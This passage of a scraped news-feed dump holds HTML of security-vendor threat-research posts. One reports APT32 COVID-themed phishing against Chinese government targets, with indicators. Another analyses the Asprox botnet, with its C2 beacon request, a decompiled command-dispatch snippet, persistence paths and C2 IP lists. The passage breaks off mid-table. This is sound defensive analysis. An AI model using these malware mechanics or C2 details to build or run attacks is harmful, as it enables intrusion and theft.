comparison of Indicators in an IOC, providing more flexibility and discrimination than simple lists of artifacts. An extensive library of <a href=\"http://openioc.org/terms/Common.iocterms\" target=\"_blank\">Indicator Terms</a> allows for a variety of information from hosts and networks to be recorded, and if something is not covered in the existing terms, additional terms may be added. Upcoming features like parameters will allow for further expansion of the standard, including customization for application or organization specific use cases.</p> \n <p>Having the OpenIOC standard in place is tremendously powerful, providing benefits for scaling detection and investigation, both of which are key parts of managing the threat lifecycle. OpenIOC enables easy, standardized information sharing once implemented, without adding much to workloads or draining resources. And it is freely available as Open Source; so that others can benefit from some of the methods we have already found to work well in our practice. We hope that as we improve it, you can take even more advantage of what OpenIOC has to offer in your IR and Threat Intelligence workflows.</p> \n <p>Next up in the <a href=\"https://www.mandiant.com/blog/basics-series-openioc/\" target=\"_blank\">Back to Basics: OpenIOC</a> series, we'll talk about some of the basics of what OpenIOC is and what using it involves - and some of the upcoming things in the future of OpenIOC.</p> \n</div>","descriptionType":"html","publishedDate":"Tue, 17 Sep 2013 23:36:51 +0000","feedId":1226,"bgimg":"","linkMd5":"1941945e3e580807da4318319b81af6b","bgimgJsdelivr":"","metaImg":"","author":"Doug Wilson","publishedOrCreatedDate":1598278264207},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Vietnamese Threat Actors APT32 Targeting Wuhan Government and Chinese\nMinistry of Emergency Management in Latest Example of COVID-19 Related Espionage","link":"http://www.fireeye.com/blog/threat-research/2020/04/apt32-targeting-chinese-government-in-covid-19-related-espionage.html","description":"<p>From at least January to April 2020, suspected Vietnamese actors APT32 carried out intrusion campaigns against Chinese targets that Mandiant Threat Intelligence believes was designed to collect intelligence on the COVID-19 crisis. Spear phishing messages were sent by the actor to China's Ministry of Emergency Management as well as the government of Wuhan province, where COVID-19 was first identified. While targeting of East Asia is consistent with the <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2017/05/cyber-espionage-apt32.html\">activity we’ve previously reported on APT32</a>, this incident, and other publicly reported intrusions, are part of a global increase in cyber espionage related to the crisis, carried out by states desperately seeking solutions and nonpublic information.</p> \n<h4>Phishing Emails with Tracking Links Target Chinese Government</h4> \n<p>The first known instance of this campaign was on Jan. 6, 2020, when APT32 sent an email with an embedded tracking link (Figure 1) to China's Ministry of Emergency Management using the sender address lijianxiang1870@163[.]com&nbsp;and the subject&nbsp;第一期办公设备招标结果报告&nbsp;(translation: Report on the first quarter results of office equipment bids). The embedded&nbsp;link contained the victim's email address and code to report back to the actors if the email was opened.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/apt32china/Picture1.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 1: Phishing email to China's Ministry of Emergency Management</span></p> \n<p>Mandiant Threat Intelligence uncovered additional tracking URLs that revealed targets in China's Wuhan government and an email account also associated with the Ministry of Emergency Management.</p> \n<ul> \n <li>libjs.inquirerjs[.]com/script/&lt;VICTIM&gt;@wuhan.gov.cn.png</li> \n <li>libjs.inquirerjs[.]com/script/&lt;VICTIM&gt;@chinasafety.gov.cn.png</li> \n <li>m.topiccore[.]com/script/&lt;VICTIM&gt;@chinasafety.gov.cn.png</li> \n <li>m.topiccore[.]com/script/&lt;VICTIM&gt;@wuhan.gov.cn.png</li> \n <li>libjs.inquirerjs[.]com/script/&lt;VICTIM&gt;@126.com.png</li> \n</ul> \n<p>The libjs.inquirerjs[.]com domain was used in December as a command and control domain for a METALJACK phishing campaign likely targeting Southeast Asian countries.</p> \n<h4>Additional METALJACK Activity Suggests Campaigns Targeting Mandarin Speakers Interested in COVID-19</h4> \n<p>APT32 likely used COVID-19-themed malicious attachments against Chinese speaking targets. While we have not uncovered the full execution chain, we uncovered a METALJACK loader displaying a Chinese-Language titled COVID-19 decoy document while launching its payload.</p> \n<p>When the METALJACK loader, krpt.dll (MD5: d739f10933c11bd6bd9677f91893986c) is loaded, the export \"_force_link_krpt\" is likely called. The loader executes one of its embedded resources, a COVID-themed RTF file, displaying the content to the victim and saving the document to %TEMP%.</p> \n<p>The decoy document (Figure 2) titled&nbsp;冠状病毒实时更新：中国正在追踪来自湖北的旅行者,&nbsp;MD5: c5b98b77810c5619d20b71791b820529 (Translation: COVID-19 live updates: China is currently tracking all travelers coming from Hubei Province) displays a copy of a New York Times article&nbsp;to the victim.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/apt32china/picture2b.jpg\" alt=\"\" /> <span class=\"type-XS\"> <br /> Figure 2: COVID-themed decoy document</span></p> \n<p>The malware also loads shellcode in an additional resource, MD5: a4808a329b071a1a37b8d03b1305b0cb, which contains the METALJACK payload. The shellcode performs a system survey to collect the victim's computer name and username and then appends those values to a URL string using libjs.inquirerjs[.]com. It then attempts to call out to the URL. If the callout is successful, the malware loads the METALJACK payload into memory.</p> \n<p>It then uses vitlescaux[.]com for command and control.</p> \n<h4>Outlook</h4> \n<p>The COVID-19 crisis poses an intense, existential concern to governments, and the current air of distrust is amplifying uncertainties, encouraging intelligence collection on a scale that rivals armed conflict. National, state or provincial, and local governments, as well as non-government organizations and international organizations, are being targeted, as seen in <a href=\"https://www.reuters.com/article/us-health-coronavirus-who-hack-exclusive/exclusive-elite-hackers-target-who-as-coronavirus-cyberattacks-spike-idUSKBN21A3BN\">reports</a>. Medical research has been targeted as well, according to <a href=\"https://www.reuters.com/article/us-health-coronavirus-cyber/fbi-official-says-foreign-hackers-have-targeted-covid-19-research-idUSKBN21Y3GL\">public statements</a> by a Deputy Assistant Director of the FBI. Until this crisis ends, we anticipate related cyber espionage will continue to intensify globally.</p> \n<h4>Indicators</h4> \n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\"> \n <tbody> \n  <tr> \n   <td width=\"129\" valign=\"top\"><p>Type</p> </td> \n   <td width=\"494\" valign=\"top\"><p>Indicators</p> </td> \n  </tr> \n  <tr> \n   <td width=\"129\" valign=\"top\"><p>Domains</p> </td> \n   <td width=\"494\" valign=\"top\"><p>m.topiccore[.]com</p> <p>jcdn.jsoid[.]com</p> <p>libjs.inquirerjs[.]com</p> <p>vitlescaux[.]com</p> </td> \n  </tr> \n  <tr> \n   <td width=\"129\" valign=\"top\"><p>Email Address</p> </td> \n   <td width=\"494\" valign=\"top\"><p>lijianxiang1870@163[.]com</p> </td> \n  </tr> \n  <tr> \n   <td width=\"129\" valign=\"top\"><p>Files</p> </td> \n   <td width=\"494\" valign=\"top\"><p>MD5: d739f10933c11bd6bd9677f91893986c</p> <p style=\"margin-left: 40.0px;\">METALJACK loader</p> <p>MD5: a4808a329b071a1a37b8d03b1305b0cb</p> <p style=\"margin-left: 40.0px;\">METALJACK Payload</p> <p>MD5: c5b98b77810c5619d20b71791b820529</p> <p style=\"margin-left: 40.0px;\">Decoy Document (Not Malicious)</p> </td> \n  </tr>\n </tbody>\n</table> \n<h4>Detecting the Techniques</h4> \n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\"> \n <tbody> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p>Platform</p> </td> \n   <td width=\"312\" valign=\"top\"><p>Signature Name</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p>Endpoint Security</p> </td> \n   <td width=\"312\" valign=\"top\"><p>Generic.mg.d739f10933c11bd6</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p>Network Security</p> </td> \n   <td width=\"312\" valign=\"top\"><p>Trojan.Apost.FEC2, Trojan.Apost.FEC3, fe_ml_heuristic</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p>Email Security</p> </td> \n   <td width=\"312\" valign=\"top\"><p>Trojan.Apost.FEC2, Trojan.Apost.FEC3, fe_ml_heuristic</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p>Helix</p> </td> \n   <td width=\"312\" valign=\"top\"><p>&nbsp;</p> </td> \n  </tr>\n </tbody>\n</table> \n<h4>Mandiant Security Validation Actions</h4> \n<ul> \n <li>A150-096 - Malicious File Transfer - APT32, METALJACK, Download</li> \n <li>A150-119 - Protected Theater - APT32, METALJACK Execution</li> \n <li>A150-104 - Phishing Email - Malicious Attachment, APT32, Contact Information Lure</li> \n</ul> \n<h4>MITRE ATT&amp;CK Technique Mapping</h4> \n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\"> \n <tbody> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p>Tactic</p> </td> \n   <td width=\"312\" valign=\"top\"><p>Techniques</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p>Initial Access</p> </td> \n   <td width=\"312\" valign=\"top\"><p>Spearphishing Attachment (T1193), Spearphising Link (T1192)</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p>Execution</p> </td> \n   <td width=\"312\" valign=\"top\"><p>Regsvr32 (T1117), User Execution (T1204)</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p>Defense Evasion</p> </td> \n   <td width=\"312\" valign=\"top\"><p>Regsvr32 (T1117)</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p>Command and Control</p> </td> \n   <td width=\"312\" valign=\"top\"><p>Standard Cryptographic Protocol (T1032), Custom Command and Control Protocol (T1094)</p> </td> \n  </tr>\n </tbody>\n</table>","descriptionType":"html","publishedDate":"Wed, 22 Apr 2020 14:00:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/apt32china/Picture1.png","linkMd5":"5c00bc472b6d225a53fc2ce9785babe1","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn59@2020_6/2020/08/24/14-11-05-252_b55f264e632043ae.webp","destWidth":936,"destHeight":402,"sourceBytes":94830,"destBytes":27724,"author":"Scott Henderson","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/apt32china/Picture1.png":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn59@2020_6/2020/08/24/14-11-05-252_b55f264e632043ae.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/apt32china/picture2b.jpg":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn91@2020_4/2020/08/24/14-11-12-660_b2c24e613ecb4cc8.webp"},"publishedOrCreatedDate":1598278264196},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"A Not-So Civic Duty: Asprox Botnet Campaign Spreads Court Dates and\nMalware","link":"http://www.fireeye.com/blog/threat-research/2014/06/a-not-so-civic-duty-asprox-botnet-campaign-spreads-court-dates-and-malware.html","description":"<p> <b>Executive Summary</b></p> \n<p>FireEye Labs has been tracking a recent spike in malicious email detections that we attribute to a campaign that began in 2013. While malicious email campaigns are nothing new, this one is significant in that we are observing mass-targeting attackers adopting the malware evasion methods pioneered by the stealthier APT attackers. And this is certainly a high-volume business, with anywhere from a few hundred to ten thousand malicious emails sent daily – usually distributing between 50 and 500,000 emails per outbreak.</p> \n<p>Through the <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/threat-intelligence.html\">FireEye Dynamic Threat Intelligence (DTI) cloud</a>, FireEye Labs discovered that each and every major spike in email blasts brought a change in the attributes of their attack. These changes have made it difficult for anti-virus, IPS, firewalls and file-based sandboxes to keep up with the malware and effectively protect endpoints from infection. Worse, if past is prologue, we can expect other malicious, mass-targeting email operators to adopt this approach to bypass traditional defenses.</p> \n<p>This blog will cover the trends of the campaign, as well as provide a short technical analysis of the payload.</p> \n<p> <b>Campaign Details</b></p> \n<p style=\"text-align: center;\"> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2014/06/fig1.png\"><img src=\"https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig1.png\" alt=\"fig1\" class=\"aligncenter  wp-image-5732 landscape-med\" width=\"540\" height=\"296\" /></a></p> \n<p style=\"text-align: center;\">Figure 1: Attack Architecture</p> \n<p>The campaign first appeared in late December of 2013 and has since been seen in fairly cyclical patterns each month. It appears that the threat actors behind this campaign are fairly responsive to published blogs and reports surrounding their malware techniques, tweaking their malware accordingly to continuously try and evade detection with success.</p> \n<p>In late 2013, malware labeled as Kuluoz, the specific spam component of the Asprox botnet, was discovered to be the main payload of what would become the first malicious email campaign. Since then, the threat actors have continuously tweaked the malware by changing its hardcoded strings, remote access commands, and encryption keys.</p> \n<p>Previously, Asprox malicious email campaigns targeted various industries in multiple countries and included a URL link in the body. The current version of Asprox includes a simple zipped email attachment that contains the malicious payload “exe.” Figure 2 below represents a sample message while <i>Figure 3</i> is an example of the various court-related email headers used in the campaign.</p> \n<p style=\"text-align: center;\"> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2014/06/fig2.png\"><img src=\"https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig2.png\" alt=\"fig2\" class=\"aligncenter  wp-image-5731 landscape-med\" width=\"546\" height=\"273\" /></a></p> \n<p style=\"text-align: center;\">Figure 2 Email Sample</p> \n<p style=\"text-align: center;\"> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2014/06/fig3.png\"><img src=\"https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig3.png\" alt=\"fig3\" class=\"aligncenter  wp-image-5730 landscape-sm\" width=\"434\" height=\"421\" /></a></p> \n<p style=\"text-align: center;\">Figure 3 Email Headers</p> \n<p>Some of the recurring campaign that Asporox used includes themes focused around airline tickets, postal services and license keys. In recent months however, the court notice and court request-themed emails appear to be the most successful phishing scheme theme for the campaign.</p> \n<p>The following list contains examples of email subject variations, specifically for the court notice theme:</p> \n<ul> \n <li>Urgent court notice</li> \n <li>Notice to Appear in Court</li> \n <li>Notice of appearance in court</li> \n <li>Warrant to appear</li> \n <li>Pretrial notice</li> \n <li>Court hearing notice</li> \n <li>Hearing of your case</li> \n <li>Mandatory court appearance</li> \n</ul> \n<p>The campaign appeared to increase in volume during the month of May. Figure 4 shows the increase in activity of Asprox compared to other crimewares towards the end of May specifically. Figure 5 highlights the regular monthly pattern of overall malicious emails. In comparison, Figure 6 is a compilation of all the hits from our analytics.</p> \n<p style=\"text-align: center;\"> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2014/06/fig4.png\"><img src=\"https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig4.png\" alt=\"fig4\" class=\"aligncenter  wp-image-5729 landscape-med\" width=\"540\" height=\"220\" /></a></p> \n<p style=\"text-align: center;\">Figure 4 Worldwide Crimeware Activity</p> \n<p style=\"text-align: center;\"> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2014/06/fig5.png\"><img src=\"https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig5.png\" alt=\"fig5\" class=\"aligncenter  wp-image-5728 landscape-med\" width=\"540\" height=\"256\" /></a></p> \n<p style=\"text-align: center;\">Figure 5 Overall Asprox Botnet tracking</p> \n<p style=\"text-align: center;\"> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2014/06/fig6.png\"><img src=\"https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig6.png\" alt=\"fig6\" class=\"aligncenter  wp-image-5727 landscape-med\" width=\"540\" height=\"250\" /></a></p> \n<p style=\"text-align: center;\">Figure 6 Asprox Botnet Activity Unique Samples</p> \n<p>These malicious email campaign spikes revealed that FireEye appliances, with the support of DTI cloud, were able to provide a full picture of the campaign (blue), while only a fraction of the emailed malware samples could be detected by various Anti-Virus vendors (yellow).</p> \n<p style=\"text-align: center;\"> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2014/06/fig7.png\"><img src=\"https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig7.png\" alt=\"fig7\" class=\"aligncenter  wp-image-5726 landscape-med\" width=\"540\" height=\"232\" /></a></p> \n<p style=\"text-align: center;\">Figure 7 FireEye Detection vs. Anti-Virus Detection</p> \n<p>By the end of May, we observed a big spike on the unique binaries associated with this malicious activity. Compared to the previous days where malware authors used just 10-40 unique MD5s or less per day, we saw about 6400 unique MD5s sent out on May 29<sup>th</sup>. That is a 16,000% increase in unique MD5s over the usual malicious email campaign we’d observed. Compared to other recent email campaigns, Asprox uses a volume of unique samples for its campaign.</p> \n<p style=\"text-align: center;\"> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2014/06/fig8.png\"><img src=\"https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig8.png\" alt=\"fig8\" class=\"aligncenter  wp-image-5725 landscape-med\" width=\"540\" height=\"229\" /></a></p> \n<p style=\"text-align: center;\">Figure 8 Asprox Campaign Unique Sample Tracking</p> \n<p style=\"text-align: center;\"> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2014/06/fig9.png\"><img src=\"https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig9.png\" alt=\"fig9\" class=\"aligncenter  wp-image-5724 landscape-med\" width=\"539\" height=\"344\" /></a></p> \n<p style=\"text-align: center;\">Figure 9 Geographical Distribution of the Campaign</p> \n<p style=\"text-align: center;\"> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2014/06/fig10.png\"><img src=\"https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig10.png\" alt=\"fig10\" class=\"aligncenter  wp-image-5723 landscape-med\" width=\"539\" height=\"276\" /></a></p> \n<p style=\"text-align: center;\">Figure 10 Distribution of Industries Affected</p> \n<p> <b>Brief Technical Analysis</b></p> \n<p style=\"text-align: center;\"> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2014/06/fig11.png\"><img src=\"https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig11.png\" alt=\"fig11\" class=\"aligncenter  wp-image-5722 landscape-med\" width=\"540\" height=\"296\" /></a></p> \n<p style=\"text-align: center;\">Figure 11 Attack Architecture</p> \n<p> <b>Infiltration</b></p> \n<p>The infiltration phase consists of the victim receiving a phishing email with a zipped attachment containing the malware payload disguised as an Office document. Figure 11 is an example of one of the more recent phishing attempts.</p> \n<p style=\"text-align: center;\"> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2014/06/fig12.png\"><img src=\"https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig12.png\" alt=\"fig12\" class=\"aligncenter  wp-image-5721 portrait-sm\" width=\"114\" height=\"133\" /></a></p> \n<p style=\"text-align: center;\">Figure 12 Malware Payload Icon</p> \n<p> <b>Evasion</b></p> \n<p>Once the victim executes the malicious payload, it begins to start an svchost.exe process and then injects its code into the newly created process. Once loaded into memory, the injected code is then unpacked as a DLL. Notice that Asprox uses a hardcoded mutex that can be found in its strings.</p> \n<ol> \n <li>Typical Mutex Generation\n  <ol> \n   <li>\"2GVWNQJz1\"</li> \n  </ol> </li> \n <li>Create svchost.exe process</li> \n <li>Code injection into svchost.exe</li> \n</ol> \n<p> <b>Entrenchment</b></p> \n<p>Once the dll is running in memory it then creates a copy of itself in the following location:</p> \n<p>%LOCALAPPDATA%/[8 CHARACTERS].EXE</p> \n<p>Example filename:</p> \n<p>%LOCALAPPDATA%\\lwftkkea.exe</p> \n<p>It’s important to note that the process will first check itself in the startup registry key, so a compromised endpoint will have the following registry populated with the executable:</p> \n<p>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</p> \n<p> <b>Exfiltration/Communication</b></p> \n<p>The malware uses various encryption techniques to communicate with the command and control (C2) nodes. The communication uses an RSA (i.e. PROV_RSA_FULL) encrypted SSL session using the Microsoft Base Cryptographic Provider while the payloads themselves are RC4 encrypted. Each sample uses a default hardcoded public key shown below.</p> \n<p>Default Public Key</p> \n<p>-----BEGIN PUBLIC KEY-----</p> \n<p>MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDCUAUdLJ1rmxx+bAndp+Cz6+5I'</p> \n<p>Kmgap2hn2df/UiVglAvvg2US9qbk65ixqw3dGN/9O9B30q5RD+xtZ6gl4ChBquqw</p> \n<p>jwxzGTVqJeexn5RHjtFR9lmJMYIwzoc/kMG8e6C/GaS2FCgY8oBpcESVyT2woV7U</p> \n<p>00SNFZ88nyVv33z9+wIDAQAB</p> \n<p>-----END PUBLIC KEY-----</p> \n<p>First Communication Packet</p> \n<p>Bot ID RC4 Encrypted URL</p> \n<p>POST /5DBA62A2529A51B506D197253469FA745E7634B4FC</p> \n<p>HTTP/1.1</p> \n<p>Accept: */*</p> \n<p>Content-Type: application/x-www-form-urlencoded</p> \n<p>User-Agent: &lt;host useragent&gt;</p> \n<p>Host: &lt;host ip&gt;:443</p> \n<p>Content-Length: 319</p> \n<p>Cache-Control: no-cache</p> \n<p>&lt;knock&gt;&lt;id&gt;5DBA62A247BC1F72B98B545736DEA65A&lt;/id&gt;&lt;group&gt;0206s&lt;/group&gt;&lt;src&gt;3&lt;/src&gt;&lt;transport&gt;0&lt;/transport&gt;&lt;time&gt;1881051166&lt;/time&gt;&lt;version&gt;1537&lt;/version&gt;&lt;status&gt;0&lt;/status&gt;&lt;debug&gt;none&lt;debug&gt;&lt;/knock&gt;</p> \n<p> <b>C2 Commands</b></p> \n<p>In comparison to the campaign at the end of 2013, the current campaign uses one of the newer versions of the Asprox family where threat actors added the command “ear.”</p> \n<p>if ( wcsicmp(Str1, L\"idl\") )</p> \n<p style=\"padding-left: 30.0px;\">{</p> \n<p style=\"padding-left: 30.0px;\">if ( wcsicmp(Str1, L\"run\") )</p> \n<p style=\"padding-left: 60.0px;\">{</p> \n<p style=\"padding-left: 60.0px;\">if ( wcsicmp(Str1, L\"rem\") )</p> \n<p style=\"padding-left: 90.0px;\">{</p> \n<p style=\"padding-left: 90.0px;\">if ( wcsicmp(Str1, L\"ear\")</p> \n<p style=\"padding-left: 120.0px;\">{</p> \n<p style=\"padding-left: 120.0px;\">if ( wcsicmp(Str1, L\"rdl\") )</p> \n<p style=\"padding-left: 150.0px;\">{</p> \n<p style=\"padding-left: 150.0px;\">if ( wcsicmp(Str1, L\"red\") )</p> \n<p style=\"padding-left: 180.0px;\">{</p> \n<p style=\"padding-left: 180.0px;\">if ( !wcsicmp(Str1, L\"upd\") )</p> \n<table class=\"c09 c09-zebra has-data-label\"> \n <tbody> \n  <tr class=\"c09_tr c09_tr-th\"> \n   <th scope=\"col\" class=\"c09_td\">C2 commands</th> \n   <th scope=\"col\" class=\"c09_td\">Description</th> \n  </tr> \n  <tr class=\"c09_tr\"> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span>idl</span></span> <span class=\"c09_td_value is-hidden-mml\">idl</span></td> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span>This commands idles the process to wait for commands</span></span> <span class=\"c09_td_value is-hidden-mml\">This commands idles the process to wait for commands</span></td> \n  </tr> \n  <tr class=\"c09_tr\"> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span>run</span></span> <span class=\"c09_td_value is-hidden-mml\">run</span></td> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span>Download from a partner site and execute from a specified path</span></span> <span class=\"c09_td_value is-hidden-mml\">Download from a partner site and execute from a specified path</span></td> \n  </tr> \n  <tr class=\"c09_tr\"> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span>rem</span></span> <span class=\"c09_td_value is-hidden-mml\">rem</span></td> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span>Remove itself</span></span> <span class=\"c09_td_value is-hidden-mml\">Remove itself</span></td> \n  </tr> \n  <tr class=\"c09_tr\"> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span>ear</span></span> <span class=\"c09_td_value is-hidden-mml\">ear</span></td> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span>Download another executable and create autorun entry</span></span> <span class=\"c09_td_value is-hidden-mml\">Download another executable and create autorun entry</span></td> \n  </tr> \n  <tr class=\"c09_tr\"> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span>rdl</span></span> <span class=\"c09_td_value is-hidden-mml\">rdl</span></td> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span>Download, inject into svchost, and run</span></span> <span class=\"c09_td_value is-hidden-mml\">Download, inject into svchost, and run</span></td> \n  </tr> \n  <tr class=\"c09_tr\"> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span>upd</span></span> <span class=\"c09_td_value is-hidden-mml\">upd</span></td> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span>Download and update</span></span> <span class=\"c09_td_value is-hidden-mml\">Download and update</span></td> \n  </tr> \n  <tr class=\"c09_tr\"> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span>red</span></span> <span class=\"c09_td_value is-hidden-mml\">red</span></td> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span>Modify the registry</span></span> <span class=\"c09_td_value is-hidden-mml\">Modify the registry</span></td> \n  </tr>\n </tbody>\n</table> \n<p> <b>C2 Campaign Characteristics</b></p> \n<p style=\"text-align: left;\"> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2014/06/fig13.jpg\"><img src=\"https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig13.jpg\" alt=\"fig13\" class=\"aligncenter  wp-image-5720 landscape-med\" width=\"547\" height=\"443\" /></a></p> \n<p style=\"text-align: left;\">For the two major malicious email campaign spikes in April and May of 2014, separate sets of C2 nodes were used for each major spike.</p> \n<table class=\"c09 c09-zebra has-data-label\"> \n <tbody> \n  <tr class=\"c09_tr c09_tr-th\"> \n   <th scope=\"col\" class=\"c09_td\">April</th> \n   <th scope=\"col\" class=\"c09_td\">May-June</th> \n  </tr> \n  <tr class=\"c09_tr\"> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span>94.23.24.58</span></span> <span class=\"c09_td_value is-hidden-mml\">94.23.24.58</span></td> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span>192.69.192.178</span></span> <span class=\"c09_td_value is-hidden-mml\">192.69.192.178</span></td> \n  </tr> \n  <tr class=\"c09_tr\"> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span>94.23.43.184</span></span> <span class=\"c09_td_value is-hidden-mml\">94.23.43.184</span></td> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span>213.21.158.141</span></span> <span class=\"c09_td_value is-hidden-mml\">213.21.158.141</span></td> \n  </tr> \n  <tr class=\"c09_tr\"> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span>1.234.53.27</span></span> <span class=\"c09_td_value is-hidden-mml\">1.234.53.27</span></td> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span>213.251.150.3</span></span> <span class=\"c09_td_value is-hidden-mml\">213.251.150.3</span></td> \n  </tr> \n  <tr class=\"c09_tr\"> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span>84.124.94.52</span></span> <span class=\"c09_td_value is-hidden-mml\">84.124.94.52</span></td> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span>27.54.87.235</span></span> <span class=\"c09_td_value is-hidden-mml\">27.54.87.235</span></td> \n  </tr> \n  <tr class=\"c09_tr\"> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span>133.242.134.76</span></span> <span class=\"c09_td_value is-hidden-mml\">133.242.134.76</span></td> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span>61.19.32.24</span></span> <span class=\"c09_td_value is-hidden-mml\">61.19.32.24</span></td> \n  </tr> \n  <tr class=\"c09_tr\"> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span>173.45.78.226</span></span> <span class=\"c09_td_value is-hidden-mml\">173.45.78.226</span></td> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span>69.64.56.232</span></span> <span class=\"c09_td_value is-hidden-mml\">69.64.56.232</span></td> \n  </tr> \n  <tr class=\"c09_tr\"> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span>37.59.9.98</span></span> <span class=\"c09_td_value is-hidden-mml\">37.59.9.98</span></td> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span>72.167.15.89</span></span> <span class=\"c09_td_value is-hidden-mml\">72.167.15.89</span></td> \n  </tr> \n  <tr class=\"c09_tr\"> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span>188.93.74.192</span></span> <span class=\"c09_td_value is-hidden-mml\">188.93.74.192</span></td> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span>84.234.71.214</span></span> <span class=\"c09_td_value is-hidden-mml\">84.234.71.214</span></td> \n  </tr> \n  <tr class=\"c09_tr\"> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span>187.16.250.214</span></span> <span class=\"c09_td_value is-hidden-mml\">187.16.250.214</span></td> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span>89.22.96.113</span></span> <span class=\"c09_td_value is-hidden-mml\">89.22.96.113</span></td> \n  </tr> \n  <tr class=\"c09_tr\"> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span>85.214.220.78</span></span> <span class=\"c09_td_value is-hidden-mml\">85.214.220.78</span></td> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span>89.232.63.147</span></span> <span class=\"c09_td_value is-hidden-mml\">89.232.63.147</span></td> \n  </tr> \n  <tr class=\"c09_tr\"> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span></span></span> <span class=\"c09_td_value is-hidden-mml\"></span></td> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span>91.121.20.71</span></span> <span class=\"c09_td_value is-hidden-mml\">91.121.20.71</span></td> \n  </tr> \n  <tr class=\"c09_tr\"> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> <span></span></span> <span class=\"c09_td_value is-hidden-mml\"></span></td> \n   <td class=\"c09_td\"><span class=\"is-visible-mml\"> 